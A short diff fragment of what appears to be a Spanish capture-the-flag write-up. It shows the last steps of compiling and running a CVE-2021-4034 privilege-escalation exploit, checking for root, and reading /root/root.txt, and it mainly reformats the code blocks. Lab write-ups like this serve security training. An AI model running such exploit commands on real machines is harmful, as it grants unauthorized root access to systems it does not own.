+</span></span><span class="line"><span class="cl">make
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./cve-2021-4034
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Si hacemos un whoami ya somos root!!!</p>
 <p>Para ver la flag hacemos un cat al root.txt</p>
-<pre><code>cat /root/root.txt
-</code></pre>
-<p>¡¡¡Máquina resuelta!!!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /root/root.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>¡¡¡Máquina resuelta!!!</p>
 
 </section>
 
